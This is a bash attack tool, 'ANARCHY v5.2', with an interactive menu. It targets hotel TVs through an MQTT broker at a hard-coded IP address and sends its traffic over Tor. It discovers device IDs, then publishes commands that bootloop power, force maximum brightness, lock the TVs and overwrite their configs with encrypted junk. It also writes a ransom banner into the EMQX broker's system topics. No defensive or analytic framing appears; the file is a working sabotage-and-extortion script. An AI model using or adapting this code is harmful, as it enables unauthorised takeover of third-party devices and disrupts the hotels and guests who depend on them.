#!/bin/bash
# ANARCHY v5.2 - SINGLE BROKER FIXED
set -euo pipefail

# SINGLE BROKER ONLY
HOST_PORT="120.55.14.230:1883"
HOST="120.55.14.230"
PORT="1883"

TOR="torsocks"
MAX_BRIGHT="255"
LOCKED_STATUS="LOCKED-TRUSTEDF57-ANARCHY-v5.2"
RANSOM_MSG="🔥  HOTEL TV TAKEOVER v5.2 🔥
TRUSTEDF57 - ALL HOTEL TVS COMPROMISED
POWER | BRIGHTNESS | CONTROL LOCKED"

ENCRYPT_PAYLOAD() {
    echo -n "$1" | openssl enc -aes-256-cbc -a -nosalt -k "TRUSTEDF57-ANARCHY" 2>/dev/null | sed 's/=//g'
}

TOR_PUB_BROKER() {
    local topic=$1 payload=$2 qos=2
    [[ $# -eq 3 ]] && qos=$3
    ${TOR} mosquitto_pub -h "${HOST}" -p "${PORT}" -r -q "$qos" -t "$topic" -m "$payload"
}

discover_targets() {
    echo "[🔍] DISCOVERING su ${HOST}:${PORT} (30s)..."
    
    timeout 30 ${TOR} mosquitto_sub -h "${HOST}" -p "${PORT}" -t "#" | \
    grep -iE "(Hotel/Tv/|/tv/)" 2>/dev/null | \
    sed 's|^.*/||' | \
    grep -E '^[a-f0-9]{32}$' | \
    sort -u > "hotel_tvs.txt" || true
    
    if [[ -s "hotel_tvs.txt" ]]; then
        echo "📺 Trovati:"
        wc -l "hotel_tvs.txt"
        head -5 "hotel_tvs.txt"
    else
        echo "❌ No TVs, fallback..."
        echo "5295191d5eb26b6eb2e6189ab7db0c9d" > "hotel_tvs.txt"
    fi
}

load_tvs() {
    if [[ -f "hotel_tvs.txt" ]]; then
        mapfile -t HOTEL_TVS < "hotel_tvs.txt"
        echo "[📺] Caricati ${#HOTEL_TVS[@]} TVs"
        return 0
    else
        echo "❌ File TVs mancante! Run discovery"
        HOTEL_TVS=()
        return 1
    fi
}

show_menu() {
    clear
    TV_COUNT=${#HOTEL_TVS[@]}
    cat << EOF
┌─ TRUSTEDF57 - ${HOST}:${PORT} (${TV_COUNT} TVs) ──┐
│ 1) 🔍 FULL DISCOVERY (30s)                          │
│ 2) 📺 FORCE TVs ONLINE                              │
│ 3) 🔄 POWER BOOTLOOP (ALL)                          │
│ 4) 💡 MAX BRIGHTNESS 255 (ALL)                      │
│ 5) 📡 EMQX BROKER RANSOM                            │
│ 6) 🔒 FULL HOTEL TVS LOCKDOWN                       │
│ 7) ⚙️ SYS BROKER OVERWRITE                          │
│ 8) 🔐 ENCRYPT ALL CONFIGS                           │
│ 9) 🎪 TOTAL ANARCHY v5.2                            │
│ 0) ❌ EXIT                                          │
└─────────────────────────────────────────────────────┘
EOF
}

check_tvs_loaded() {
    [[ ${#HOTEL_TVS[@]} -eq 0 ]] && { 
        echo "❌ No TVs! Run 1) DISCOVERY"
        return 1
    }
    return 0
}

force_all_tvs_online() {
    check_tvs_loaded || return
    echo "[📺] ${#HOTEL_TVS[@]} TVs -> ONLINE..."
    for tv in "${HOTEL_TVS[@]}"; do
        TOR_PUB_BROKER "Hotel/Tv/${tv}" "ONLINE-LOCKED-TRUSTEDF57" 1
    done
    echo "✅ Online"
}

tv_power_bootloop_all() {
    check_tvs_loaded || return
    echo "[🔄] BOOTLOOP ${#HOTEL_TVS[@]} TVs..."
    bootloop="POWER1 1;Delay 800;POWER1 0;Delay 400;POWER1 1;Delay 1500;POWER1 0;LOOP"
    for tv in "${HOTEL_TVS[@]}"; do
        TOR_PUB_BROKER "Hotel/Tv/${tv}/POWER" "BOOTLOOP-START"
        TOR_PUB_BROKER "Hotel/Tv/${tv}/CMND" "${bootloop}"
    done
    echo "✅ Bootloop"
}

max_brightness_all() {
    check_tvs_loaded || return
    echo "[💡] BRIGHTNESS 255 ${#HOTEL_TVS[@]} TVs..."
    for tv in "${HOTEL_TVS[@]}"; do
        TOR_PUB_BROKER "Hotel/Tv/${tv}/POWER" "1"
        TOR_PUB_BROKER "Hotel/Tv/${tv}/BRIGHTNESS" "${MAX_BRIGHT}"
        TOR_PUB_BROKER "Hotel/Tv/${tv}" "MAX-BRIGHT-LOCKED"
    done
    echo "✅ Max brightness"
}

emqx_ransom() {
    echo "[📡] RANSOM ${HOST}:${PORT}..."
    TOR_PUB_BROKER "\$SYS/brokers/emqx@127.0.0.1/sysdescr" "${RANSOM_MSG}"
    TOR_PUB_BROKER "\$SYS/brokers/emqx@127.0.0.1/version" "${LOCKED_STATUS}"
    TOR_PUB_BROKER "\$SYS/brokers" "ANARCHY-v5.2"
    echo "✅ Ransomed"
}

hotel_tvs_lockdown() {
    check_tvs_loaded || return
    echo "[🔒] LOCKDOWN ${#HOTEL_TVS[@]} TVs..."
    locked_data="{\"status\":\"${LOCKED_STATUS}\",\"brightness\":${MAX_BRIGHT},\"power\":\"1\"}"
    crypt_data=$(ENCRYPT_PAYLOAD "${locked_data}")
    
    for tv in "${HOTEL_TVS[@]}"; do
        TOR_PUB_BROKER "Hotel/Tv/${tv}" "${LOCKED_STATUS}"
        TOR_PUB_BROKER "Hotel/Tv/${tv}/status" "${crypt_data}"
        TOR_PUB_BROKER "Hotel/Tv/${tv}/config" "${crypt_data}"
    done
    echo "✅ Locked"
}

sys_broker_overwrite() {
    echo "[⚙️] SYS OVERWRITE..."
    TOR_PUB_BROKER "\$SYS/brokers/emqx@127.0.0.1/sysdescr" "ANARCHY-EMQX-v5.2"
    TOR_PUB_BROKER "\$SYS/brokers" "${LOCKED_STATUS}"
    TOR_PUB_BROKER "\$SYS/brokers/emqx@127.0.0.1/version" "5.2-COMPROMISED"
    echo "✅ Overwritten"
}

all_configs_encrypted() {
    check_tvs_loaded || return
    echo "[🔐] ENCRYPT ${#HOTEL_TVS[@]} CONFIGS..."
    encrypt_payload="{\"v\":\"5.2\",\"status\":\"ENCRYPTED\",\"control\":\"BLOCKED\"}"
    crypt_payload=$(ENCRYPT_PAYLOAD "${encrypt_payload}")
    
    for tv in "${HOTEL_TVS[@]}"; do
        TOR_PUB_BROKER "Hotel/Tv/${tv}/config" "${crypt_payload}"
        TOR_PUB_BROKER "Hotel/Tv/${tv}/status" "${crypt_payload}"
        TOR_PUB_BROKER "Hotel/Tv/${tv}/power" "${crypt_payload}"
        TOR_PUB_BROKER "Hotel/Tv/${tv}/brightness" "${crypt_payload}"
    done
    echo "✅ Encrypted"
}

total_anarchy_v52() {
    check_tvs_loaded || return
    echo "🎪 TOTAL ANARCHY v5.2 - ${#HOTEL_TVS[@]} TVs..."
    force_all_tvs_online
    sleep 2; tv_power_bootloop_all
    sleep 2; max_brightness_all
    sleep 2; emqx_ransom
    sleep 2; hotel_tvs_lockdown
    sleep 2; sys_broker_overwrite
    sleep 2; all_configs_encrypted
    echo "🎉 ANARCHY COMPLETE!"
}

# MAIN LOOP
HOTEL_TVS=()
clear; echo "🏨 ANARCHY v5.2 - ${HOST}:${PORT}"

while true; do
    show_menu
    read -r CHOICE
    case "${CHOICE}" in
        1) discover_targets; load_tvs ;;
        2) force_all_tvs_online ;;
        3) tv_power_bootloop_all ;;
        4) max_brightness_all ;;
        5) emqx_ransom ;;
        6) hotel_tvs_lockdown ;;
        7) sys_broker_overwrite ;;
        8) all_configs_encrypted ;;
        9) total_anarchy_v52 ;;
        0) echo "EXIT"; exit 0 ;;
        *) echo "❌ ${CHOICE} invalido" ;;
    esac
    echo; read -p "⏸️  ENTER..."
done
